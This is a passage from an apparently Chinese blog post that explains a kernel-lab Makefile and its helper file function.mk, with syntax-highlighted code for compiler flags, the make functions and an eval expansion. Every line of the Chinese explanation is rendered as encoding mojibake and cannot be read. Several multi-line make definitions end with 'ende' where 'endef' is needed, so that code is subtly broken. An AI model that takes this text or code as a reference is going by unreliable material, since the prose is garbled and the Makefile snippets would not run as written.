å…¥è°ƒè¯•ä¿¡æ¯ï¼Œä¾¿äºä¹‹åä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•ï¼›</li><li>-Wallï¼šä½¿èƒ½æ‰€æœ‰ç¼–è¯‘è­¦å‘Šï¼Œä¾¿äºå‘ç°æ½œåœ¨çš„é”™è¯¯ï¼›</li><li>-O2: å¼€å¯O2ç¼–è¯‘ä¼˜åŒ–ï¼›</li><li>-fno-builtin: ä¸æ‰¿è®¤æ‰€æœ‰ä¸æ˜¯ä»¥<strong>builtin</strong>ä¸ºå¼€å¤´çš„å†…å»ºå‡½æ•°ï¼›</li><li>-ggdb äº§ç”Ÿgdbæ‰€éœ€è¦çš„è°ƒè¯•ä¿¡æ¯ï¼ˆä¸-gçš„åŒºåˆ«æ˜¯ggdbçš„è°ƒè¯•ä¿¡æ¯æ˜¯ä¸“é—¨ä¸ºgdbè€Œç”Ÿæˆçš„ï¼‰ï¼›</li><li>-m32: 32ä½æ¨¡å¼ï¼›</li><li>-gstabsï¼šä»¥stabsæ ¼å¼è¾“å‡ºè°ƒè¯•ä¿¡æ¯ï¼Œä¸åŒ…æ‹¬gdbæ‹“å±•ï¼›</li><li>-nostdinc: ä¸æœç´¢é»˜è®¤è·¯å¾„å¤´æ–‡ä»¶ï¼›</li><li>-fno-stack-protector: ç¦ç”¨å †æ ˆä¿æŠ¤;</li><li>-nostdlib: è¯¥é“¾æ¥å™¨é€‰é¡¹è¡¨ç¤ºä¸é“¾æ¥ä»»ä½•ç³»ç»Ÿæ ‡å‡†å¯åŠ¨æ–‡ä»¶å’Œæ ‡å‡†åº“æ–‡ä»¶ï¼Œè¿™æ˜¯å› ä¸ºç¼–è¯‘æ“ä½œç³»ç»Ÿå†…æ ¸å’Œbootloaderæ˜¯ä¸éœ€è¦è¿™äº›å¯åŠ¨æ–‡ä»¶å’Œåº“å°±åº”è¯¥èƒ½å¤Ÿæ‰§è¡Œçš„ï¼›</li></ul></li><li>å…¶ä»–æ¶‰åŠåˆ°çš„bashå‘½ä»¤é€‰é¡¹ä¸ºï¼š<ul><li>mkdir -p: å…è®¸åˆ›å»ºåµŒå¥—å­ç›®å½•ï¼›</li><li>touch -c: ä¸åˆ›å»ºå·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼›</li><li>rm -f: æ— è§†ä»»ä½•ç¡®è®¤æç¤ºï¼›</li></ul></li></ul><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># eliminate default suffix rules</span><br><span class="hljs-section">.SUFFIXES: .c .S .h</span><br><br><span class="hljs-comment"># delete target files if there is an error (or make is interrupted)</span><br><span class="hljs-section">.DELETE_ON_ERROR:</span><br><br><span class="hljs-comment"># define compiler and flags</span><br><span class="hljs-keyword">ifndef</span>  USELLVM<br>HOSTCC      := gcc<br>HOSTCFLAGS  := -g -Wall -O2<br>CC      := <span class="hljs-variable">$(GCCPREFIX)</span>gcc<br>CFLAGS  := -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc <span class="hljs-variable">$(DEFS)</span><br>CFLAGS  += <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> <span class="hljs-variable">$(CC)</span> -fno-stack-protector -E -x c /dev/null &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo -fno-stack-protector)</span><br><span class="hljs-keyword">else</span><br>HOSTCC      := clang<br>HOSTCFLAGS  := -g -Wall -O2<br>CC      := clang<br>CFLAGS  := -fno-builtin -Wall -g -m32 -mno-sse -nostdinc <span class="hljs-variable">$(DEFS)</span><br>CFLAGS  += <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> <span class="hljs-variable">$(CC)</span> -fno-stack-protector -E -x c /dev/null &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo -fno-stack-protector)</span><br><span class="hljs-keyword">endif</span><br><br>CTYPE   := c S<br><br>LD      := <span class="hljs-variable">$(GCCPREFIX)</span>ld<br>LDFLAGS := -m <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> <span class="hljs-variable">$(LD)</span> -V | grep elf_i386 2&gt;/dev/null)</span><br>LDFLAGS += -nostdlib<br><br>OBJCOPY := <span class="hljs-variable">$(GCCPREFIX)</span>objcopy<br>OBJDUMP := <span class="hljs-variable">$(GCCPREFIX)</span>objdump<br><br>COPY    := cp<br>MKDIR   := mkdir -p<br>MV      := mv<br>RM      := rm -f<br>AWK     := awk<br>SED     := sed<br>SH      := sh<br>TR      := tr<br>TOUCH   := touch -c<br><br>OBJDIR  := obj<br>BINDIR  := bin<br><br>ALLOBJS :=<br>ALLDEPS :=<br>TARGETS :=<br></code></pre></div></td></tr></table></figure><ul><li>æ¥ä¸‹æ¥çš„éƒ¨åˆ†å¼•ç”¨äº†tools/function.mkæ–‡ä»¶ï¼Œå› æ­¤ä¸ä»¿åˆ†æè¯¥æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š</li></ul><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># list all files in some directories: (#directories, #types)</span><br>listf = <span class="hljs-variable">$(<span class="hljs-built_in">filter</span> $(<span class="hljs-built_in">if</span> $(2)</span>,<span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> %.,$(2)</span>),%),\<br>          <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> $(<span class="hljs-built_in">addsuffix</span> <span class="hljs-variable">$(SLASH)</span>*,$(1)</span>))<br></code></pre></div></td></tr></table></figure><p>ä¸Šè¿°å®šä¹‰äº†ä¸€ä¸ªè·å–æŸä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æŸç±»å‹æ–‡ä»¶çš„è¡¨è¾¾å¼ï¼Œè¯¥è¡¨è¾¾å¼å¯ä»¥ä½¿ç”¨callå‡½æ•°è°ƒç”¨æ¥ä½¿ç”¨ï¼Œå…¶ä¸­<code>$(if $(2),$(addprefix %.,$(2)),%)</code>éƒ¨åˆ†æ˜¯ç”¨äºæ„é€ ä¸€ä¸ª<code>%.</code>æŸåç¼€å½¢å¼çš„patternï¼Œ<code>$(wildcard $(addsuffix $(SLASH)*,$(1))</code>éƒ¨åˆ†åˆ™æ˜¯è¢«æ˜¯ç”¨æ¥è·å–å½“å‰ç›®å½•ä¸‹çš„è€Œæ‰€æœ‰æ–‡ä»¶ï¼Œå¹¶ä¸”ä½¿ç”¨filterå‡½æ•°è¿‡æ»¤å‡ºè¿™æ‰€æœ‰æ–‡ä»¶ä¸­å…·æœ‰.$(2) (å³callä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°)åç¼€çš„æ–‡ä»¶ï¼›</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># get .o obj files: (#files[, packet])</span><br>toobj = <span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> <span class="hljs-variable">$(OBJDIR)</span><span class="hljs-variable">$(SLASH)</span>$(<span class="hljs-built_in">if</span> $(2)</span>,$(2)<span class="hljs-variable">$(SLASH)</span>),\<br>        <span class="hljs-variable">$(<span class="hljs-built_in">addsuffix</span> .o,$(<span class="hljs-built_in">basename</span> $(1)</span>))<br></code></pre></div></td></tr></table></figure><p>è¯¥è¡¨è¾¾å¼è¡¨ç¤ºå°†ä¼ å…¥çš„æ–‡ä»¶ååˆ—è¡¨ä¸­çš„æ‰€æœ‰åç¼€ä¿®æ”¹ä¸º.oï¼Œå¹¶ä¸”å°†å…¶æ·»åŠ ä¸Šè¿™äº›.oæ–‡ä»¶çš„ç›®å½•ï¼Œè·å–åˆ°è¿™äº›.oæ–‡ä»¶æœ€ç»ˆåº”è¯¥å­˜æ”¾çš„ä½ç½®ï¼›</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># get .d dependency files: (#files[, packet])</span><br>todep = <span class="hljs-variable">$(<span class="hljs-built_in">patsubst</span> %.o,%.d,$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(2))<br></code></pre></div></td></tr></table></figure><p>å°†æ‰€æœ‰.oæ–‡ä»¶çš„åç¼€åä¿®æ”¹ä¸º.d;</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile">totarget = <span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> <span class="hljs-variable">$(BINDIR)</span><span class="hljs-variable">$(SLASH)</span>,$(1)</span>)<br></code></pre></div></td></tr></table></figure><p>è·å–ç”±ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„binaryæ–‡ä»¶æœ€ç»ˆåº”å½“å­˜æ”¾çš„ä½ç½®ï¼›</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># change $(name) to $(OBJPREFIX)$(name): (#names)</span><br>packetname = <span class="hljs-variable">$(<span class="hljs-built_in">if</span> $(1)</span>,<span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> <span class="hljs-variable">$(OBJPREFIX)</span>,$(1)</span>),<span class="hljs-variable">$(OBJPREFIX)</span><br></code></pre></div></td></tr></table></figure><p>ç»™ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„æ‰€æœ‰æ–‡ä»¶ååŠ ä¸Š$(OBJPREFIX)å‰ç¼€ï¼›</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># cc compile template, generate rule for dep, obj: (file, cc[, flags, dir])</span><br><span class="hljs-keyword">define</span> cc_template<br>$<span class="hljs-variable">$(<span class="hljs-built_in">call</span> todep,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -MM $<span class="hljs-variable">$&lt;</span> -MT <span class="hljs-string">&quot;$$(patsubst %.d,%.o,$<span class="hljs-variable">$@</span>) $<span class="hljs-variable">$@</span>&quot;</span>&gt; $<span class="hljs-variable">$@</span><br>$<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @echo + cc $<span class="hljs-variable">$&lt;</span><br>    <span class="hljs-variable">$(V)</span>$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -c $<span class="hljs-variable">$&lt;</span> -o $<span class="hljs-variable">$@</span><br>ALLOBJS += $<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4))<br>ende<br></code></pre></div></td></tr></table></figure><p>è¿™éƒ¨åˆ†ä½¿ç”¨defineå¤šè¡Œå®šä¹‰äº†ä¸€ä¸ªç¼–è¯‘çš„æ¨¡æ¿(å¯¹å•ä¸ªæ–‡ä»¶è¿›è¡Œç¼–è¯‘æˆobjectæ–‡ä»¶)ï¼Œå…¶ä¸­è‹¥å¹²å¤„$$è¡¨ç¤ºåŸæœ¬çš„å­—ç¬¦$ï¼Œè¿™æ˜¯å› ä¸ºåæ–‡ä¸­å°†å¯¹è¿™ä¸ªéƒ¨åˆ†æ‰§è¡Œevalï¼Œè€Œ$$&lt;å³åŸæœ¬çš„$&lt;è¡¨ç¤ºäº†ä¾èµ–ç›®æ ‡çš„å€¼ï¼Œ$@è¡¨ç¤ºäº†ç›®æ ‡çš„å€¼, åœ¨æœ¬éƒ¨åˆ†ä¸­ï¼Œå°†æœ€ç»ˆç”Ÿæˆå‡ºç›®æ ‡æ–‡ä»¶çš„ä¾èµ–æ–‡ä»¶ï¼Œä»¥åŠå®šä¹‰äº†ç”Ÿæˆç›®æ ‡æ–‡ä»¶çš„è§„åˆ™;</p><p><strong>æ›´å…·ä½“ä¸€ç‚¹ï¼Œè¯¥æ¨¡æ¿çš„å‰åŠéƒ¨åˆ†æ˜¯ç”¨äºç”ŸæˆMakefile .dä¾èµ–æ–‡ä»¶ï¼ˆåˆ©ç”¨gccçš„-MMé€‰é¡¹ï¼‰ï¼ŒååŠéƒ¨åˆ†åˆ™æ˜¯ä½¿ç”¨gccç¼–è¯‘å‡º.oæ–‡ä»¶, å¹¶ä¸”å°†æ‰€æœ‰.oæ–‡ä»¶åŠ å…¥åˆ°ALLOBJSå˜é‡ä¸­ï¼›</strong> </p><p><strong>å…³äºä¸Šè¿°ä»£ç ä¸­çš„$(V)çš„ä½¿ç”¨</strong>ï¼Œå‘ç°åŸæœ¬<code>V</code>å˜é‡å®šä¹‰çš„æ˜¯@, ä¹Ÿå°±æ˜¯ä¸åœ¨shellä¸­è¾“å‡ºçš„ç¬¦å·, å¦‚æœåœ¨makeå‘½ä»¤è¡Œä¸­overide the definition of V, ä¹Ÿå°±æ˜¯ä½¿ç”¨<code>V=</code>èµ‹å€¼ä¸ºç©º, é‚£ä¹ˆ<code>$(V)</code>åé¢çš„å‘½ä»¤å°±ä¼šè¢«è¾“å‡º.</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-keyword">define</span> do_cc_compile<br>$<span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> f,$(1)</span>,$<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">call</span> cc_template,$<span class="hljs-variable">$(f)</span>,$(2)</span>,$(3),$(4))))<br>ende<br></code></pre></div></td></tr></table></figure><p>è¡¨ç¤ºå°†ä¼ å…¥çš„æ–‡ä»¶åˆ—è¡¨ä¸­çš„æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½ä½¿ç”¨cc_templateè¿›è¡Œç”Ÿæˆç¼–è¯‘æ¨¡æ¿ï¼›</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># add files to packet: (#files, cc[, flags, packet, dir])</span><br><span class="hljs-keyword">define</span> do_add_files_to_packet<br>__temp_packet__ := <span class="hljs-variable">$(<span class="hljs-built_in">call</span> packetname,$(4)</span>)<br><span class="hljs-keyword">ifeq</span> ($<span class="hljs-variable">$(<span class="hljs-built_in">origin</span> $<span class="hljs-variable">$(__temp_packet__)</span>)</span>,undefined)<br>$<span class="hljs-variable">$(__temp_packet__)</span> :=<br><span class="hljs-keyword">endif</span><br>__temp_objs__ := <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(5))<br>$<span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> f,$(1)</span>,$<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">call</span> cc_template,$<span class="hljs-variable">$(f)</span>,$(2)</span>,$(3),$(5))))<br>$<span class="hljs-variable">$(__temp_packet__)</span> += $<span class="hljs-variable">$(__temp_objs__)</span><br>ende<br></code></pre></div></td></tr></table></figure><p>ä¸Šè¿°ä»£ç ä¸­ï¼Œé¦–å…ˆä½¿ç”¨call packetnameç”Ÿæˆå‡ºæŸä¸€ä¸ªpacketnameå¯¹åº”çš„makefileä¸­å˜é‡çš„åå­—ï¼Œç„¶åä½¿ç”¨originæŸ¥è¯¢è¿™ä¸ªå˜é‡æ˜¯å¦å·²ç»å®šä¹‰è¿‡ï¼Œå¦‚æœä¸ºå®šä¹‰ï¼Œåˆ™åˆå§‹åŒ–è¯¥å˜é‡ä¸ºç©ºï¼›ä¹‹åä½¿ç”¨toobjç”Ÿæˆå‡ºè¯¥packetä¸­æ‰€éœ€è¦çš„ç”Ÿæˆçš„.oæ–‡ä»¶çš„æ–‡ä»¶ååˆ—è¡¨ï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°ä»¥__temp_packet__è¿™ä¸ªå˜é‡ä¸­æ‰€å­˜çš„å€¼ä½œä¸ºåå­—çš„å˜é‡ä¸­å»ï¼Œå¹¶ä¸”ä½¿ç”¨cc_templateç”Ÿæˆå‡ºè¯¥packetç”Ÿæˆ.dæ–‡ä»¶å’Œ.oæ–‡ä»¶çš„ä»£ç ï¼›</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># add objs to packet: (#objs, packet)</span><br><span class="hljs-keyword">define</span> do_add_objs_to_packet<br>__temp_packet__ := <span class="hljs-variable">$(<span class="hljs-built_in">call</span> packetname,$(2)</span>)<br><span class="hljs-keyword">ifeq</span> ($<span class="hljs-variable">$(<span class="hljs-built_in">origin</span> $<span class="hljs-variable">$(__temp_packet__)</span>)</span>,undefined)<br>$<span class="hljs-variable">$(__temp_packet__)</span> :=<br><span class="hljs-keyword">endif</span><br>$<span class="hljs-variable">$(__temp_packet__)</span> += $(1)<br>ende<br></code></pre></div></td></tr></table></figure><p>ä¸Šè¿°ä»£ç è¡¨ç¤ºå°†æŸä¸€ä¸ª.oæ–‡ä»¶æ·»åŠ åˆ°æŸä¸€ä¸ªpacketå¯¹åº”çš„makefileä¸­çš„å˜é‡ä¸­çš„æ–‡ä»¶åˆ—è¡¨ä¸­å»ï¼›ä¸¾ä¾‹ï¼Œå¦‚æœè¦æ·»åŠ a.oåˆ°packè¿™ä¸€ä¸ªpacketä¸­ï¼Œåˆ™ç»“æœå°±æ˜¯__objs_è¿™ä¸ªå˜é‡ä¼šæ‰§è¡Œ__objs_pack += a.oè¿™ä¸ªä¸€ä¸ªæ“ä½œï¼›</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># add packets and objs to target (target, #packes, #objs[, cc, flags])</span><br><span class="hljs-keyword">define</span> do_create_target<br>__temp_target__ = <span class="hljs-variable">$(<span class="hljs-built_in">call</span> totarget,$(1)</span>)<br>__temp_objs__ = $<span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> p,$(<span class="hljs-built_in">call</span> packetname,$(2)</span>),$$($<span class="hljs-variable">$(p)</span>)) $(3)<br>TARGETS += $<span class="hljs-variable">$(__temp_target__)</span><br><span class="hljs-keyword">ifneq</span> ($(4),)<br><span class="hljs-section">$$(__temp_target__): $<span class="hljs-variable">$(__temp_objs__)</span> | $$$$(dir $$$<span class="hljs-variable">$@</span>)</span><br>    <span class="hljs-variable">$(V)</span>$(4) $(5) $<span class="hljs-variable">$^</span> -o $<span class="hljs-variable">$@</span><br><span class="hljs-keyword">else</span><br><span class="hljs-section">$$(__temp_target__): $<span class="hljs-variable">$(__temp_objs__)</span> | $$$$(dir $$$<span class="hljs-variable">$@</span>)</span><br><span class="hljs-keyword">endif</span><br>ende<br></code></pre></div></td></tr></table></figure><p>ä¸Šè¿°ä»£ç è¡¨ç¤ºå°†ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„binary targetså’Œç¬¬ä¸‰ä¸ªå‚æ•°ä¼ å…¥çš„objectæ–‡ä»¶å‡æ·»åŠ åˆ°TARGETSå˜é‡ä¸­å»ï¼Œä¹‹åæ ¹æ®ç¬¬4ä¸ªå‚æ•°æ˜¯å¦ä¼ å…¥gccç¼–è¯‘å‘½ä»¤æ¥ç¡®å®šæ˜¯å¦ç”Ÿæˆç¼–è¯‘çš„è§„åˆ™ï¼›</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># finish all</span><br><span class="hljs-keyword">define</span> do_finish_all<br>ALLDEPS = $$(ALLOBJS:.o=.d)<br>$<span class="hljs-variable">$(<span class="hljs-built_in">sort</span> $$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$(ALLOBJS)</span>)</span> <span class="hljs-variable">$(BINDIR)</span><span class="hljs-variable">$(SLASH)</span> <span class="hljs-variable">$(OBJDIR)</span><span class="hljs-variable">$(SLASH)</span>):<br>    @<span class="hljs-variable">$(MKDIR)</span> $<span class="hljs-variable">$@</span><br>ende<br></code></pre></div></td></tr></table></figure><p>åˆ›å»ºç¼–è¯‘è¿‡ç¨‹ä¸­æ‰€éœ€è¦çš„å­ç›®å½•ï¼›</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># --------------------  function end  --------------------</span><br><span class="hljs-comment"># compile file: (#files, cc[, flags, dir])</span><br>cc_compile = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_cc_compile,$(1)</span>,$(2),$(3),$(4)))<br><br><span class="hljs-comment"># add files to packet: (#files, cc[, flags, packet, dir])</span><br>add_files = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_add_files_to_packet,$(1)</span>,$(2),$(3),$(4),$(5)))<br><br><span class="hljs-comment"># add objs to packet: (#objs, packet)</span><br>add_objs = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_add_objs_to_packet,$(1)</span>,$(2)))<br><br><span class="hljs-comment"># add packets and objs to target (target, #packes, #objs, cc, [, flags])</span><br>create_target = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_create_target,$(1)</span>,$(2),$(3),$(4),$(5)))<br><br>read_packet = <span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> p,$(<span class="hljs-built_in">call</span> packetname,$(1)</span>),$(<span class="hljs-variable">$(p)</span>))<br><br>add_dependency = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(1)</span>: $(2))<br><br>finish_all = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_finish_all)</span><br></code></pre></div></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿™éƒ¨åˆ†åˆ™æ˜¯ä½¿ç”¨evalæ¥è¿›ä¸€æ­¥å°†åŸå…ˆè®¾è®¡å¥½çš„ç¼–è¯‘ä»£ç çš„è¡¨è¾¾å¼ä¸­çš„å˜é‡æ›¿æ¢ä¸ºå˜é‡çš„æ•°å€¼ï¼Œä»è€Œæ–¹ä¾¿åé¢ç”Ÿæˆç¼–è¯‘çš„è§„åˆ™ï¼Œæ¥ä¸‹æ¥ä¸å¦¨ä»¥cc_compileè¿™ä¸ªè¡¨è¾¾å¼çš„æ±‚å€¼ä¸ºä¾‹ï¼Œè¯´æ˜Makefileä¸­æ˜¯å¦‚ä½•ç”Ÿæˆç¼–è¯‘è§„åˆ™çš„ï¼š</p><blockquote><p>ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œä¸å¦¨å‡è®¾ä¼ å…¥cc_compileè¿™ä¸ªè¡¨è¾¾å¼çš„å››ä¸ªå‚æ•°åˆ†åˆ«ä¸ºmain.c, gcc, -Wall, bin, åˆ™ä¸å¦¨é¦–å…ˆè®¡ç®—<code>$(call do_cc_compile,$(1),$(2),$(3),$(4))</code>è¡¨è¾¾å¼çš„æ•°å€¼å¦‚ä¸‹ï¼š</p></blockquote><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile">cc_compile  <br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_cc_compile,$(1)</span>,$(2),$(3),$(4))<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">foreach</span> f,$(1)</span>,$<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">call</span> cc_template,$<span class="hljs-variable">$(f)</span>,$(2)</span>,$(3),$(4))))<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">foreach</span> f, $(1)</span>, <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> cc_template, <span class="hljs-variable">$(f)</span>, $(2)</span>, $(3), $(4)))))<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> cc_template, $(1)</span>, $(2), $(3), $(4)))) (since $(1)=main.c)<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">eval</span> </span><br><span class="hljs-variable">$$(<span class="hljs-built_in">call</span> todep,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -MM $<span class="hljs-variable">$&lt;</span> -MT <span class="hljs-string">&quot;$$(patsubst %.d,%.o,$<span class="hljs-variable">$@</span>) $<span class="hljs-variable">$@</span>&quot;</span>&gt; $<span class="hljs-variable">$@</span><br>$<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @echo + cc $<span class="hljs-variable">$&lt;</span><br>    <span class="hljs-variable">$(V)</span>$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> 